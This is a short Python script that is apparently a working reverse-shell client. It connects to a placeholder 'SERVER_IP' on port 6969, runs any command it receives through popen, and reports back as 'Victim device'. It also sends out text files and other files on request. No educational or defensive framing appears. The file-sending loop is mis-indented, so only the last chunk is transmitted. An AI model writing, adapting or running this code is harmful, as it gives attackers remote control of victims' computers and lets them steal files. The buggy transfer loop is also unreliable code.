import socket
from os import popen, chdir, getcwd, stat, path
import tqdm
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("SERVER_IP", 6969))
while True:
    data = s.recv(1024).decode("UTF-8")
    path = getcwd()
    if data[:2] == 'cd': # command to change directory (cd)
        chdir(data[3:])
    if len(data) > 0 and "open " in data and data[-3:] == "txt":
        print("4")
        print(data)
        with open(data[5:], "r") as f:
            s.send(str(f.read().splitlines()).encode('UTF-8'))
    if len(data)> 0 and "download" in data:
        filename = data[9:]
        print(filename)
        filesize = stat(filename).st_size
        s.send(f"{filename}|{filesize}".encode())
        if s.recv(1024).decode() == "Start":
            #make progress bar
            progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
            with open(filename, "rb") as f:
                for _ in progress:
                # read the bytes from the file
                    bytes_read = f.read(4096)
                if not bytes_read:
                    # file transmitting is done
                    break
            # we use sendall to assure transimission in 
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    if len(data)> 0:
        output = popen(data).read().splitlines()
        popen("cls || clear")
        print("3")
        s.send(str("Victim device | ").encode("utf-8") + str(str(getcwd()) + " >").encode('utf-8')  + str(output).encode('utf-8'))
    